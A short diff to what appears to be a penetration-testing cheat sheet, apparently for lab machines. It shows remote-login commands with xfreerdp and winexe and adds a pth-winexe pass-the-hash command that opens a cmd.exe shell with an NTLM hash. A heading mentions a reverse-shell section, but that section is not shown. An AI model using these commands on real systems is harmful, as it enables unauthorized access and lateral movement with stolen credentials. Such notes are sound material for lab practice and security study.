@@ -6,10 +6,12 @@
 xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.34.38
 ```
 
-### Connecting with winexe
+### Connecting with winexe or pth-winexe
 
 ```text
 winexe -U 'admin%password' //10.10.107.212 cmd.exe
+
+pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.107.212 cmd.exe
 ```
 
 ### Making SMB Server to send Rev-shell
